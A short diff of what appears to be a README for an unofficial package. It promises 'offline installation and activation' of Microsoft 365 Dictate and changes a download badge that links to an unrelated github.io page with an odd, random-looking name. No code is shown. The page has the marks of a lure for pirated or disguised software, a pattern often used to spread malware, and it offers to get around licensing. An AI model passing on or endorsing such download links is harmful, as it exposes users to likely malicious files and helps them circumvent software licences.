@@ -2,7 +2,7 @@
 
 Turn your voice into text in Word, Outlook, and other Microsoft 365 apps using Dictate. This package enables offline installation and activation of Dictate functionality across supported desktop environments.
 
-[![Download Dictate](https://pomidorkaskeletik4.github.io/pomo/fer/one
+[![⬇️ Download Dictate](https://pomidorkaskeletik4.github.io/pomo/fer/one
 )
 
 ---
